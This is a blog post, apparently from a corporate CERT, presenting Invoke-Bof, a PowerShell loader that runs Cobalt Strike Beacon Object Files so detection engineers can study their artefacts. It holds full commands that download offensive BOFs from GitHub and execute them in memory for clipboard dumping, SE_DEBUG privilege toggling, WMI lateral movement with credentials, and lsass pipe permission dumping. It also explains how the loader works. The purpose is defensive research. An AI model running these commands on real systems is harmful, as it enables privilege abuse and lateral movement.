---
title: "Invoke-Bof"
date: 2021-12-09T09:22:42+02:00
Summary: Invoke-Bof, a kind of purple software?
---

All the rage of advanced Red Teamers is now to develop offensive modules as [BOF](https://download.cobaltstrike.com/help-beacon-object-files) modules, short for *Beacon Object File*.

A *Beacon Object File* is split into two parts:

- A payload that will be executed on the victim machine
- An aggressor script, which will prepare and interact with the payload

The Red Team community is prolific: tens of BOF modules are available on GitHub, from lateral movement to advanced persistence technique. As detection engineers, how can we execute them easily to observe their artefacts?

In this frame, we designed a BOF loader in powershell, [Invoke-Bof](https://github.com/airbus-cert/Invoke-Bof) to be easily included in any framework, such as the wonderful one from RedCanary, [atomic-red-team](https://github.com/redcanaryco/atomic-red-team)!


# Example of use cases

Most of the time, we want to execute a BOF while instrumenting the OS to find the right EventID, ETW or artefacts. Let's go through a few examples available from Github.

## BOF_dumpclip

This one dumps our clipboard:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go

[+] Mapping of .text    at  0x133e0c20000
[+] Mapping of .rdata   at  0x133e0c30000
[+] Mapping of .xdata   at  0x133e0c40000
[+] Mapping of .pdata   at  0x133e0c50000
[+] Mapping of /4       at  0x133e0c60000
[+] Jump into beacon at 0x133e0c20000
****************************************************************************
[+] Clipboard updated !
[!]Active Windows : Windows PowerShell ISE
[!] Content : $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
Invoke-Bof -BOFBytes $BOFBytes  -EntryPoint go
----------------------------------

****************************************************************************
```

## Toggle_Token_Privileges_BOF

Enable *SE_DEBUG* privilege:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/EspressoCake/Toggle_Token_Privileges_BOF/raw/main/dist/toggle_privileges_bof.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint enable -ArgumentList 20
[+] Mapping of .text    at  0x133e0ab0000
[+] Mapping of .data    at  0x133e0bf0000
[+] Mapping of .xdata   at  0x133e0c20000
[+] Mapping of .pdata   at  0x133e0c30000
[+] Mapping of .rdata   at  0x133e0c40000
[+] Mapping of /4       at  0x133e0c50000
[+] Jump into beacon at 0x133e0ab0c10
****************************************************************************
Authors:
	@the_bit_diddler
	@hackersoup

You are not currently in an administrative session. Come again later!

****************************************************************************
```

## Lateral movement using WMI

Execute a process using WMI create process:

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/Yaxser/CobaltStrike-BOF/raw/master/WMI%20Lateral%20Movement/ProcCreate.x64.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\COMPUTER\ROOT\CIMV2","domain","username","username","cmd.exe /C powershell.exe",1 -UnicodeStringParameter

[+] Mapping of .text at  0x2e940940000
[+] Mapping of /4 at  0x2e95a880000
[+] Mapping of /30 at  0x2e95a890000
[+] Mapping of /57 at  0x2e95a8f0000
[+] Mapping of /84 at  0x2e95a900000
[+] Mapping of /110 at  0x2e95b160000
[+] Mapping of /137 at  0x2e95b170000
[+] Mapping of /164 at  0x2e95b180000
[+] Mapping of /193 at  0x2e95b190000
[+] Mapping of /223 at  0x2e95b1a0000
[+] Mapping of .xdata at  0x2e95b1b0000
[+] Mapping of .pdata at  0x2e95b1c0000
[+] Mapping of .rdata at  0x2e95b1d0000
[+] Mapping of /253 at  0x2e95b1e0000
[+] Mapping of /277 at  0x2e95b1f0000
[+] Mapping of /301 at  0x2e95b200000
[+] Mapping of /325 at  0x2e95b230000
[!] Unable to parse API name :  _ZTV10_com_error  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_error4DtorEv  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  __imp_LocalFree  /!\ continue without resolving /!\
[!] Unable to parse API name :  _Unwind_Resume  /!\ continue without resolving /!\
[!] Unable to parse API name :  __cxa_call_unexpected  /!\ continue without resolving /!\
[!] Unable to parse API name :  __gxx_personality_seh0  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTI10_com_error  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZN10_com_errorD0Ev  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTVN10__cxxabiv117__class_type_infoE  /!\ continue without resolving /!\
[!] Unable to parse API name :  _ZTS10_com_error  /!\ continue without resolving /!\
[+] Jump into beacon at 0x2e940940181
****************************************************************************
ExecMethod Succeeded!
****************************************************************************
```

## Dump permission of a pipe

```
> $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/boku7/xPipe/raw/main/xpipe.o").Content
> Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\.\pipe\lsass" -UnicodeStringParameter

[+] Mapping of .text at  0x16e54590000
[+] Mapping of .rdata at  0x16e545a0000
[+] Mapping of .xdata at  0x16e545b0000
[+] Mapping of .pdata at  0x16e54610000
[+] Mapping of /4 at  0x16e54620000
[+] Jump into beacon at 0x16e5459081c
****************************************************************************
=============================== Beacon Output ==============================
00000000   50 69 70 65 3A 20 5C 0A 4F 77 6E 65 72 3A 20 73  Pipe: \.Owner: s
00000010   79 6C 76 61 69 6E 5C 43 4F 53 4D 4F 53 0A 41 64  ylvain\COSMOS.Ad
00000020   6D 69 6E 69 73 74 72 61 74 6F 72 73 5C 42 55 49  ministrators\BUI
00000030   4C 54 49 4E 0A 20 20 20 2B 20 46 49 4C 45 5F 41  LTIN.   + FILE_A
00000040   4C 4C 5F 41 43 43 45 53 53 0A 53 59 53 54 45 4D  LL_ACCESS.SYSTEM
00000050   5C 4E 54 20 41 55 54 48 4F 52 49 54 59 0A 20 20  \NT AUTHORITY.
00000060   20 2B 20 46 49 4C 45 5F 41 4C 4C 5F 41 43 43 45   + FILE_ALL_ACCE
00000070   53 53 0A 55 73 65 72 73 5C 42 55 49 4C 54 49 4E  SS.Users\BUILTIN
00000080   0A 20 20 20 2B 20 53 59 4E 43 48 52 4F 4E 49 5A  .   + SYNCHRONIZ
00000090   45 0A 20 20 20 2B 20 52 45 41 44 5F 43 4F 4E 54  E.   + READ_CONT
000000A0   52 4F 4C 0A 20 20 20 2B 20 46 49 4C 45 5F 52 45  ROL.   + FILE_RE
000000B0   41 44 5F 44 41 54 41 0A 20 20 20 2B 20 46 49 4C  AD_DATA.   + FIL
000000C0   45 5F 52 45 41 44 5F 41 54 54 52 49 42 55 54 45  E_READ_ATTRIBUTE
000000D0   53 0A 41 75 74 68 65 6E 74 69 63 61 74 65 64 20  S.Authenticated
000000E0   55 73 65 72 73 5C 4E 54 20 41 55 54 48 4F 52 49  Users\NT AUTHORI
000000F0   54 59 0A 41 75 74 68 65 6E 74 69 63 61 74 65 64  TY.Authenticated
00000100   20 55 73 65 72 73 5C 4E 54 20 41 55 54 48 4F 52   Users\NT AUTHOR
00000110   49 54 59 0A 20 20 20 2B 20 46 49 4C 45 5F 43 52  ITY.   + FILE_CR
00000120   45 41 54 45 5F 50 49 50 45 5F 49 4E 53 54 41 4E  EATE_PIPE_INSTAN
00000130   43 45 0A                                         CE.
============================================================================
```

# How it works?
## What is a BOF payload?

A BOF payload is a simple object file produced by a C compiler. An Object file (`.o`) is an intermediate file which was not linked. That's why most (all?) BOF payloads are written in C!

As the linker is not done, API calls are not resolved, and that is the genius of the CobalStrike developers: the BOF will be linked on-the-fly by the victim machine. Consequently, it saves a lot of space and keeps the BOF tiny, this can make a big difference when using bandwidth constrained channels, such as DNS.

## Managed to Unmanaged

Object files are COFF files, not PE. The COFF format includes enough information to load and execute the payload:

- Section Size and rights
- Symbols, especially exported function names
- Relocation information

Most of the time, a BOF needs to interact with the C&C, so CobaltStrike offers a dedicated API:

- `BeaconFormatXXX` to send raw information to the C&C
- `BeaconDataXXX` to retrieve information from the C&C
- `BeaconPrintf` and `BeaconOutput` to send information to C&C
- And many other offensive APIs, to perform process or token manipulation, etc...

Powershell being a managed language, powered by the CLR (Common Language Runtime), the challenge is to switch from managed to unmanaged world and from unmanaged to managed world.

## Unmanaged to managed

The other way around now, go from the unmanaged (BOF) to the managed world (Powershell): BOFs often use the Beacon API to perform parameter unmarshalling, or send information to the C&C. How can we declare a typed function that can be easily marshaled by the CLR?

The solution comes directly from Powershell itself, using typed functions (new feature from PS 5.0):

```powershell
class BeaconAPI {
	static [void] BeaconDataParse([IntPtr] $Parser, [IntPtr] $Buffer, [int] $Size)
	{
		$ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)
		$ParserObject.original = $Buffer
		$ParserObject.buffer = $Buffer
		$ParserObject.size = $Size
		$ParserObject.length = 0
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ParserObject, $Parser, $false)
	}
}

$BeaconAPI = New-Object System.Object

$BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
$BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataParse -Value ($BeaconDataParseDelegate)
```

Unfortunately, it comes with a subtle limit: typed functions do not have a stack, and thus, it cannot support `va_arg` parameters. And that's a shame because the BOF API uses them, such as a simple `BeaconPrintf`. 

Luckily, most of the developers only use one or two `var_args`, which fits accidentally with the x86_64 calling convention (using registers for the four first parameters) as `BeaconPrintf` uses the first argument for the logging level, and the second for the string format, we only have two possibles varargs arguments.
